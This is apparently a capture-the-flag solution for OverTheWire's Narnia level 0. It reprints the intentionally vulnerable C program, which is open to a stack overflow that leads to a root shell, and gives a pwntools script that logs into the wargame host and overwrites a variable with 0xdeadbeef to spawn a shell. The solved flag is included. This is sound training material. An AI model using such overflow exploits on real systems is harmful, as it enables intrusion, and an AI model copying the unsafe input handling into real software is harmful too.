'''
OverTheWire
Narnia Level0
Jake Mai

Source code:

************************************************************************
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    return 0;
}

************************************************************************
Simple challenge, overflow val, then overwrite buf with 0xdeadbeef
buf should be right next to val on the stack so offset should be the size of buf: 20

'''
#Exploit
from pwn import *

def pwn():
    shesh = ssh(host="narnia.labs.overthewire.org",
                user="narnia0",
                password="narnia0",
                port=2226)
    leggo=shesh.process("/narnia/narnia0")
    leggo.sendline("A"*20+"\xef\xbe\xad\xde")
    leggo.interactive()

if __name__ == "__main__":
    pwn()

# Flag: efeidiedae
